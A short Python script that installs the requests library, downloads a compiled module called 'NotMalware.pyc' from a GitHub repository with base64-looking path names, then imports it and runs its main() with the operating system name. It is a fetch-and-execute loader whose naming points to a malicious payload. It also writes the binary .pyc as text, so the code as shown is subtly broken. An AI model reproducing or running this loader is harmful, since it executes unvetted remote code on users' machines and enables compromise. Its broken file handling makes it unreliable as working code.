import platform
import subprocess
import sys
subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]) ##Installs dependency modules
import requests

response = requests.get("https://raw.github.com/R0lUSFVC/TUFMV0FS/master/NotMalware.pyc")
with open("NotMalware.pyc", "w") as file:
    file.write(response.text)
import NotMalware
platform = platform.system()
NotMalware.main(platform)